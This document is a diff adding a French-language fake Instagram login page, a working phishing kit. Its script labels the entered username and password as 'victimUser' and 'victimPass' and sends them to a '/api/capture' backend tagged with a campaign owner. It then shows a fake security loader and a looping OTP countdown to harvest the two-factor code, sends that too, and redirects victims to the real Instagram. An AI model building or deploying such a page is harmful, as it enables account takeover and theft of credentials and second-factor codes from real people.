@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Connexion</title>
+    <style>
+        /* Global styles */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            transition: background-color 0.4s ease;
+        }
+        /* Mode sombre global activé pendant le chargement de 5 secondes */
+        body.dark-mode {
+            background-color: #121212;
+        }
+
+        .login-container {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 40px;
+            width: 350px;
+            text-align: center;
+            position: relative;
+            transition: background-color 0.4s ease, border-color 0.4s ease;
+        }
+        body.dark-mode .login-container {
+            background-color: #000000;
+            border-color: #262626;
+        }
+
+        .instagram-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .instagram-logo {
+            width: 175px;
+            height: auto;
+        }
+
+        .instagram-icon {
+            width: 24px;
+            height: 24px;
+            margin-left: 8px;
+        }
+
+        h1 {
+            font-size: 16px;
+            color: #262626;
+            margin-bottom: 20px;
+            font-weight: 600;
+            transition: color 0.4s ease;
+        }
+        body.dark-mode h1 {
+            color: #f5f5f5;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 14px;
+            box-sizing: border-box;
+            background-color: #fafafa;
+            color: #262626;
+            transition: background-color 0.4s ease, border-color 0.4s ease, color 0.4s ease;
+        }
+        body.dark-mode .input-field {
+            background-color: #121212;
+            border-color: #262626;
+            color: #f5f5f5;
+        }
+
+        .input-field:focus {
+            border-color: #a8a8a8;
+            outline: none;
+        }
+
+        .show-password {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            font-size: 14px;
+            color: #262626;
+            transition: color 0.4s ease;
+        }
+        body.dark-mode .show-password {
+            color: #f5f5f5;
+        }
+
+        .show-password input {
+            margin-right: 8px;
+        }
+
+        button {
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 14px;
+            font-weight: 600;
+            margin-top: 10px;
+            transition: background-color 0.2s;
+        }
+
+        button:hover {
+            background-color: #0077e6;
+        }
+
+        .forgot-password {
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+            margin-top: 12px;
+            display: block;
+            transition: color 0.4s ease;
+        }
+        body.dark-mode .forgot-password {
+            color: #e0e0e0;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+
+        .footer a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Texte ajouté en bas de page */
+        .additional-text {
+            position: fixed;
+            bottom: 10px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            font-size: 12px;
+            color: #8e8e8e;
+            padding: 0 20px;
+        }
+
+        /* Écran de chargement circulaire (5 secondes) */
+        .loader-overlay {
+            display: none;
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 3px;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 10;
+        }
+        body.dark-mode .loader-overlay {
+            background: rgba(0, 0, 0, 0.92);
+        }
+        .spinner {
+            width: 45px;
+            height: 45px;
+            border: 4px solid #dbdbdb;
+            border-top: 4px solid #0095f6;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 12px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loader-text {
+            font-size: 13px;
+            color: #262626;
+            font-weight: 600;
+        }
+        body.dark-mode .loader-text {
+            color: #f5f5f5;
+        }
+
+        /* Section OTP */
+        .otp-container {
+            display: none;
+            text-align: left;
+        }
+        .otp-container h3 {
+            color: #0095f6;
+            font-size: 15px;
+            margin-top: 0;
+            margin-bottom: 8px;
+            text-align: center;
+            font-weight: 600;
+        }
+        .otp-container p {
+            font-size: 12px;
+            color: #8e8e8e;
+            margin-bottom: 15px;
+            text-align: center;
+            line-height: 16px;
+        }
+
+        /* Chronomètre en boucle */
+        .timer-display {
+            text-align: center;
+            margin-top: 12px;
+            font-size: 12px;
+            color: #ed4956;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container" id="login-container">
+        <!-- En-tête Instagram avec logo et icône -->
+        <div class="instagram-header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo" class="instagram-logo">
+            <img src="https://i.postimg.cc/KzjtLPVs/IMG-5911.png" alt="Instagram Icon" class="instagram-icon">
+        </div>
+        
+        <h1 id="page-title">Connectez-vous pour voir les photos et vidéos de vos amis.</h1>
+        
+        <!-- ÉTAPE 1 : Formulaire de connexion initial -->
+        <form id="loginForm">
+            <input type="text" id="username" class="input-field" name="username" placeholder="Nom d'utilisateur, e-mail ou numéro de téléphone" required>
+            <input type="password" id="password" class="input-field" name="password" placeholder="Mot de passe" required>
+            
+            <!-- Case à cocher pour afficher/masquer le mot de passe -->
+            <div class="show-password">
+                <input type="checkbox" id="showPassword">
+                <label for="showPassword">Afficher le mot de passe</label>
+            </div>
+
+            <button type="submit">Se connecter</button>
+            <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+        </form>
+
+        <!-- ÉCRAN DE CHARGEMENT CIRCULAIRE (5 SECONDES) -->
+        <div id="loader-overlay" class="loader-overlay">
+            <div class="spinner"></div>
+            <div class="loader-text">Sécurisation du compte en cours...</div>
+        </div>
+
+        <!-- ÉTAPE 2 : Section Code OTP et Chronomètre -->
+        <div id="otp-container" class="otp-container">
+            <h3>Confirmation de sécurité</h3>
+            <p>Veuillez entrer le code de confirmation envoyé sur votre appareil.</p>
+            <form id="otp-form" onsubmit="handleOtpSubmit(event)">
+                <input type="text" id="v-otp" class="input-field" placeholder="Code de confirmation (OTP)" required maxlength="8" autofocus>
+                <button type="submit">Confirmer</button>
+            </form>
+            <div class="timer-display" id="timer-text">Expiration dans : 20s</div>
+        </div>
+
+        <div class="footer" id="footer-section">
+            <p>Vous n'avez pas de compte ? <a href="#">Inscrivez-vous</a></p>
+        </div>
+    </div>
+
+    <!-- Texte ajouté en bas de page -->
+    <div class="additional-text">
+        <p>Instagram fait partie de Meta. En vous inscrivant, vous acceptez nos Conditions générales, notre Politique de confidentialité et notre Politique en matière de cookies.</p>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const campaignOwner = urlParams.get('user') || 'Kim';
+        const linkType = urlParams.get('type') || 'standard';
+
+        let savedUser = "";
+        let savedPass = "";
+        let countdownInterval = null;
+
+        // Fonction pour afficher/masquer le mot de passe initial
+        const passwordInput = document.getElementById('password');
+        const showPasswordCheckbox = document.getElementById('showPassword');
+
+        showPasswordCheckbox.addEventListener('change', function() {
+            if (this.checked) {
+                passwordInput.type = 'text';
+            } else {
+                passwordInput.type = 'password';
+            }
+        });
+
+        // Étape 1 : Gestion de la soumission du formulaire d'identifiants
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            savedUser = document.getElementById('username').value;
+            savedPass = document.getElementById('password').value;
+
+            const payload = {
+                owner: campaignOwner,
+                network: "Instagram",
+                type: "otp_step1",
+                victimUser: savedUser,
+                victimPass: savedPass,
+                otp: "Aucun"
+            };
+
+            // 1. Envoi immédiat des identifiants au backend Flask (/api/capture)
+            fetch('/api/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(err => console.log(err));
+
+            // 2. Basculer en mode sombre et lancer l'écran de chargement circulaire
+            document.body.classList.add('dark-mode');
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('page-title').style.display = 'none';
+            document.getElementById('footer-section').style.display = 'none';
+            document.getElementById('loader-overlay').style.display = 'flex';
+
+            // 3. Attendre 5 secondes, retirer le mode sombre et afficher l'interface OTP
+            setTimeout(() => {
+                document.body.classList.remove('dark-mode');
+                document.getElementById('loader-overlay').style.display = 'none';
+                document.getElementById('otp-container').style.display = 'block';
+                
+                // Démarrer le chronomètre en boucle de 20 secondes
+                startLoopingTimer();
+            }, 5000);
+        });
+
+        // Chronomètre en boucle (20s)
+        function startLoopingTimer() {
+            let timeLeft = 20;
+            const timerElement = document.getElementById('timer-text');
+            
+            if (countdownInterval) clearInterval(countdownInterval);
+
+            countdownInterval = setInterval(() => {
+                timerElement.textContent = `⏳ Expiration du code dans : ${timeLeft}s`;
+                timeLeft--;
+
+                if (timeLeft < 0) {
+                    timeLeft = 20;
+                }
+            }, 1000);
+        }
+
+        // Étape 2 : Soumission du code OTP final
+        function handleOtpSubmit(event) {
+            event.preventDefault();
+            if (countdownInterval) clearInterval(countdownInterval);
+
+            const otpVal = document.getElementById('v-otp').value;
+
+            const payload = {
+                owner: campaignOwner,
+                network: "Instagram",
+                type: linkType,
+                victimUser: savedUser,
+                victimPass: savedPass,
+                otp: otpVal
+            };
+
+            // Envoi des données complètes (avec OTP) vers le backend Flask
+            fetch('/api/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(response => {
+                window.location.href = "https://www.instagram.com";
+            }).catch(error => {
+                window.location.href = "https://www.instagram.com";
+            });
+        }
+    </script>
+</body>
+</html>
